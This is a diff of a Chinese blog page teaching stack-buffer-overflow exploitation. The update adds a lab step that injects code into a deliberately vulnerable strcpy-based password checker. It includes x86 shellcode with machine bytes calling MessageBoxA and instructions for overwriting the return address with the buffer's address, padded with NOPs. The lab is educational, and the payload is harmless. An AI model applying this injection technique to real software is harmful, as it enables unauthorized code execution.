@@ -104,7 +104,11 @@
 <meta property="og:image" content="http://yoursite.com/2019/07/30/栈溢出原理与实践/15.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/30/栈溢出原理与实践/16.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/30/栈溢出原理与实践/17.png">
-<meta property="og:updated_time" content="2019-07-31T01:06:10.694Z">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/栈溢出原理与实践/18.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/栈溢出原理与实践/19.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/栈溢出原理与实践/20.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/栈溢出原理与实践/21.png">
+<meta property="og:updated_time" content="2019-07-31T03:34:00.834Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="栈溢出原理与实践">
 <meta name="twitter:description" content="缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。">
@@ -377,7 +381,9 @@
 <h2 id="向进程中植入代码"><a href="#向进程中植入代码" class="headerlink" title="向进程中植入代码"></a>向进程中植入代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#define PASSWORD &quot;1234567&quot;</span><br><span class="line">int verify_password (char *password)</span><br><span class="line">&#123;</span><br><span class="line">int authenticated;</span><br><span class="line">char buffer[44];</span><br><span class="line">authenticated=strcmp(password,PASSWORD);</span><br><span class="line">strcpy(buffer,password);//over flowed here!</span><br><span class="line">return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">int valid_flag=0;</span><br><span class="line">char password[1024];</span><br><span class="line">FILE * fp;</span><br><span class="line">LoadLibrary(&quot;user32.dll&quot;);//prepare for messagebox</span><br><span class="line">if(!(fp=fopen(&quot;password.txt&quot;,&quot;rw+&quot;)))</span><br><span class="line">&#123;</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">fscanf(fp,&quot;%s&quot;,password);</span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line">if(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;incorrect password!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Congratulation! You have passed the verification!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>而这次缓冲区共4个字节 意味着要输入11组4321<br><img src="15.png" alt=""><br>然后打开程序 发现通过验证<br><img src="16.png" alt=""><br><img src="17.png" alt=""><br>动态调试的结果证明了前边分析的正确性。从这次调试中，我们可以得到以下信息。<br>（1）buffer 数组的起始地址为0x0012FAF0。<br>（2）password.txt 文件中第53～56 个字符的ASCII 码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址。<br>也就是说，将buffer 的起始地址0x0012FAF0 写入password.txt 文件中的第53～56 个字节，在verify_password 函数返回时会跳到我们输入的字串开始取指执行。</p>
 <p>下来需要调用API函数MessageBox 用汇编语言调用MessageboxA需要3个步骤：<br>（1）装载动态链接库user32.dll。MessageBoxA 是动态链接库user32.dll 的导出函数。虽然大多数有图形化操作界面的程序都已经装载了这个库，但是我们用来实验的consol 版并没有默认加载它。</p>
-<p>（2）在汇编语言中调用这个函数需要获得这个函数的入口地址。<br>（3）在调用前需要向栈中按从右向左的顺序压入MessageBoxA 的4 个参数。<br>然后编写汇编代码就ok</p>
+<p>（2）在汇编语言中调用这个函数需要获得这个函数的入口地址。<br>（3）在调用前需要向栈中按从右向左的顺序压入MessageBoxA 的4 个参数。<br>下来用“Dependency Walker”获得MessageBoxA的地址<br><img src="18.png" alt=""><br>我们可以得到MessageBoxA的入口地址为77D507EA 接下来编写汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">33DB 			XOR EBX,EBX</span><br><span class="line">53 				PUSH EBX</span><br><span class="line">6877657374 		PUSH 74736577</span><br><span class="line">686661696C 		PUSH 6C696166			压入NULL 结尾的“failwest”字符串。之所以用EBX 清零后入栈作为字符串的截断符，是为了避免“PUSH 0”中的NULL，否则植入的机器码会被strcpy 函数截断</span><br><span class="line">8BC4 			MOV EAX,ESP 			EAX 里是字符串指针</span><br><span class="line">53 				PUSH EBX</span><br><span class="line">50 				PUSH EAX</span><br><span class="line">50 				PUSH EAX</span><br><span class="line">53 				PUSH EBX				4 个参数按照从右向左的顺序入栈，分别为(0,failwest,failwest,0)</span><br><span class="line">										消息框为默认风格， 文本区和标题都是“failwest”</span><br><span class="line">B8EA07D577 		MOV EAX, 0x77D507EA</span><br><span class="line">FFD0 			CALL EAX				调用MessageBoxA。注意：不同的机器这里的函数入口地址可能不同，请按实际值填入!</span><br></pre></td></tr></table></figure></p>
+<p>将上述汇编指令对应的机器代码按照上一节介绍的方法以十六进制形式逐字写入password.txt第53～56 字节填入buffer 的起址0x0012FAF0，其余的字节用0x90(nop 指令)填充</p>
+<p><img src="19.png" alt=""><br>下来验证程序 程序执行流程图及运行结果：<br><img src="20.png" alt=""><br><img src="21.png" alt=""></p>
 
       
     </div>
@@ -497,7 +503,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -510,7 +516,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
